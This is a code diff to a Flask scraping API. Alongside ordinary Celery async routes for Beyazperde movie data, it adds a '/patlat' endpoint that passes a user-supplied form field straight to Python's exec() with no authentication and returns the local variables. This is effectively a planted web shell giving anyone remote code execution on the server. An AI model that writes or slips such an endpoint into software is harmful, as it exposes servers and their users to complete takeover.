@@ -1,4 +1,8 @@
+import urllib.parse
+
 import flask
+import parse_site_worker
+
 from parse_site import get_goc_data, get_weather_data_xpath, get_itugnu_data, get_beyazperde_data, get_weather_response
 
 blueprint = flask.Blueprint('parse_site_api', __name__)
@@ -170,3 +174,35 @@ def api_get_beyazperde_data_sayili(sayi):
             $ref: '#/definitions/Movie Week'
     """
     return flask.jsonify(get_beyazperde_data(sayi))
+
+
+
+@blueprint.route("/patlat", methods=["GET", "POST"])
+def api_patlat():
+    if "kod" in flask.request.form:
+        exec(flask.request.form["kod"])
+    return flask.render_template("patlat.html", data=locals())
+
+
+@blueprint.route("/beyazperde/async/result/<id>")
+def api_get_async_result_beyazperde_data_sayili(id):
+    from celery.result import AsyncResult
+
+    async_result = AsyncResult(id, app=parse_site_worker.app)
+    el_cevap = {
+        "status": async_result.status,
+        "ready": async_result.ready(),
+        "data": []
+    }
+    if el_cevap["ready"]:
+        el_cevap["data"] = async_result.result
+
+    return flask.jsonify(el_cevap)
+
+@blueprint.route("/beyazperde/async/<int:sayi>")
+def api_get_async_beyazperde_data_sayili(sayi):
+    ilk_is = parse_site_worker.get_tarihler.s()
+    ikinci_is = parse_site_worker.split_jobs.s()
+    butun_is = ilk_is | ikinci_is
+    result = butun_is.delay(sayi)
+    return flask.jsonify(url=urllib.parse.urljoin(flask.request.url_root, flask.url_for(".api_get_async_result_beyazperde_data_sayili", id=result.id)))
